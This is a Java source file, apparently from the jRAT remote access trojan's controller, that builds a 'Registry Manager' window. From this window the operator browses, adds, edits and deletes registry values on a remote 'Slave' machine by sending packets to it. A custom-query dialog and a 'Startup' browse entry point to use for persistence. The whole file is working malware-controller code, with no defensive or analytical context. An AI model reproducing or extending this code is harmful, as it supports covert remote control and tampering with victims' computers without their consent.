package io.jrat.controller.ui.frames;

import iconlib.IconUtils;
import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.Packet79BrowseRegistry;
import io.jrat.controller.packets.outgoing.Packet97RegistryAdd;
import io.jrat.controller.packets.outgoing.Packet99RegistryDelete;
import io.jrat.controller.ui.components.DefaultJTable;
import io.jrat.controller.ui.components.TableModel;
import io.jrat.controller.ui.dialogs.DialogCustomRegQuery;
import io.jrat.controller.ui.renderers.table.RegistryTableRenderer;
import io.jrat.controller.utils.Utils;

import java.awt.BorderLayout;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.JToolBar;
import javax.swing.ScrollPaneConstants;

import com.redpois0n.pathtree.FolderTreeNode;
import com.redpois0n.pathtree.NodeClickListener;
import com.redpois0n.pathtree.PathJTree;
import com.redpois0n.pathtree.PathTreeModel;
import com.redpois0n.pathtree.PathTreeNode;

@SuppressWarnings( "serial" )
public class FrameRemoteRegistry extends BaseFrame {

	public static final Map<Slave, FrameRemoteRegistry> INSTANCES = new HashMap<Slave, FrameRemoteRegistry>();
	public static final ImageIcon ICON_REGSZ = IconUtils.getIcon("registry-string");
	public static final ImageIcon ICON_REG01 = IconUtils.getIcon("registry-bin");
	public static final ImageIcon ICON_FOLDER = IconUtils.getIcon("folder");
	public static final String[] ROOT_VALUES = new String[] { "HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER", "HKEY_CLASSES_ROOT", "HKEY_USERS", "HKEY_CURRENT_CONFIG" };

	private TableModel model;
	private JTable table;
	private JTextField txt;
	private JPopupMenu popupMenu;
	private JMenuItem mntmAdd;
	private JMenuItem mntmDelete;
	private JMenuItem mntmEditValue;
	private JMenu mnBrowse;
	private JMenuItem mntmStartup;
	private RegistryTableRenderer renderer;
	private PathJTree tree;

	public TableModel getModel() {
		return model;
	}

	public FrameRemoteRegistry(Slave s) {
		super(s);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		INSTANCES.put(slave, this);
		setTitle("Registry Manager");
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteRegistry.class.getResource("/icons/registry.png")));
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 800, 500);
		setLayout(new BorderLayout(0, 0));
		
		JToolBar toolBar = new JToolBar();
		toolBar.setFloatable(false);

		JSplitPane splitPane = new JSplitPane();
		splitPane.setResizeWeight(0.7);
		add(splitPane, BorderLayout.CENTER);

		JScrollPane scrollPane = new JScrollPane();
		splitPane.setRightComponent(scrollPane);
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		table = new DefaultJTable();
		table.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				int row = table.getSelectedRow();
				if (e.getClickCount() == 2 && row != -1) {
					if (table.getValueAt(row, 1) == null) {
						String value = table.getValueAt(row, 0).toString();
						clear();
						execute(value);
						txt.setText(value);
					}
				}
			}
		});

		table.setRowHeight(25);
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Key", "Value", "Type" }) {
			@Override
			public boolean isCellEditable(int row, int column) {
				return false;
			}
		});

		renderer = new RegistryTableRenderer();
		table.setDefaultRenderer(Object.class, renderer);

		popupMenu = new JPopupMenu();

		Utils.addPopup(table, popupMenu);

		mntmAdd = new JMenuItem("Add Value");
		mntmAdd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				addValue();
			}
		});
		mntmAdd.setIcon(IconUtils.getIcon("key-plus"));
		popupMenu.add(mntmAdd);

		mntmDelete = new JMenuItem("Delete Value");
		mntmDelete.setIcon(IconUtils.getIcon("key-minus"));
		mntmDelete.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				removeValue();
			}
		});
		popupMenu.add(mntmDelete);
		popupMenu.addSeparator();

		mntmEditValue = new JMenuItem("Edit Value");
		mntmEditValue.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				editValue();
			}
		});
		mntmEditValue.setIcon(IconUtils.getIcon("key-pencil"));
		popupMenu.add(mntmEditValue);
		popupMenu.addSeparator();

		mnBrowse = new JMenu("Browse");
		mnBrowse.setIcon(IconUtils.getIcon("bookmark-go"));
		popupMenu.add(mnBrowse);

		mntmStartup = new JMenuItem("Startup");
		mnBrowse.add(mntmStartup);
		scrollPane.setViewportView(table);

		JScrollPane scrollPane_1 = new JScrollPane();
		splitPane.setLeftComponent(scrollPane_1);

		tree = new PathJTree();
		tree.setDelimiter("\\");
		tree.addFolderClickListener(new NodeClickListener() {
			@Override
			public void itemSelected(PathTreeNode node, String path) {
				clear();
				execute(path);
				txt.setText(path);
			}
		});
		scrollPane_1.setViewportView(tree);

		for (String root : ROOT_VALUES) {
			getTreeModel().addRoot(new FolderTreeNode(root, IconUtils.getIcon("folder-network")));
		}

		txt = new JTextField();
		toolBar.add(txt);
		txt.setEditable(false);
		txt.setColumns(10);

		JButton btnReload = new JButton("Reload");
		toolBar.add(btnReload);
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				reload();
			}
		});
		btnReload.setIcon(IconUtils.getIcon("update"));

		JButton btnClear = new JButton("Clear");
		toolBar.add(btnClear);
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});
		btnClear.setIcon(IconUtils.getIcon("clear"));

		JButton btnAdd = new JButton("Add");
		toolBar.add(btnAdd);
		btnAdd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				addValue();
			}
		});
		btnAdd.setIcon(IconUtils.getIcon("key-plus"));

		JButton btnRemove = new JButton("Remove");
		toolBar.add(btnRemove);
		btnRemove.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				removeValue();
			}
		});
		btnRemove.setIcon(IconUtils.getIcon("key-minus"));

		JButton btnEdit = new JButton("Edit");
		toolBar.add(btnEdit);
		btnEdit.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				editValue();
			}
		});
		btnEdit.setIcon(IconUtils.getIcon("key-pencil"));

		JButton btnCustomCommand = new JButton("Custom");
		btnCustomCommand.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				DialogCustomRegQuery frame = new DialogCustomRegQuery(slave);
				frame.setVisible(true);
			}
		});
		btnCustomCommand.setIcon(IconUtils.getIcon("key-arrow"));
		toolBar.add(btnCustomCommand);
		add(toolBar, BorderLayout.NORTH);
		
		tree.expandRow(0);
		tree.setRootVisible(false);
	}

	public void execute(String location) {
		slave.addToSendQueue(new Packet79BrowseRegistry(location));
	}

	public void exit() {
		INSTANCES.remove(slave);
	}

	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}

	public void reload() {
		clear();
		String value;
		value = txt.getText();
		execute(value);
	}

	public void addValue() {
		String name = Utils.showDialog("Add Value", "Input the name of the value to be created");
		if (name == null) {
			return;
		}
		String type = Utils.showDialog("Add Value", "Input type of value to be created, like:\n\nREG_SZ, REG_MULTI_SZ, REG_DWORD");
		if (type == null) {
			return;
		}
		String data = Utils.showDialog("Add Value", "Input the data to assign to the value being added");
		if (data == null) {
			return;
		}
		slave.addToSendQueue(new Packet97RegistryAdd(txt.getText(), name, type, data));
		reload();
	}

	public void removeValue() {
		int row = table.getSelectedRow();
		if (row != -1) {
			String val = table.getValueAt(row, 0).toString();
			slave.addToSendQueue(new Packet99RegistryDelete(txt.getText(), val));
			reload();
		}
	}

	public void editValue() {
		int row = table.getSelectedRow();
		if (row != -1) {
			String val = model.getValueAt(row, 0).toString();
			String type = model.getValueAt(row, 2).toString();
			String data = Utils.showDialog("Edit Value", "Input the data to replace the current data with");
			if (data == null) {
				return;
			}

			slave.addToSendQueue(new Packet97RegistryAdd(txt.getText(), val, type, data));

			reload();
		}
	}

	public RegistryTableRenderer getRenderer() {
		return renderer;
	}

	public PathTreeModel getTreeModel() {
		return (PathTreeModel) tree.getModel();
	}

	public PathJTree getTree() {
		return tree;
	}
}
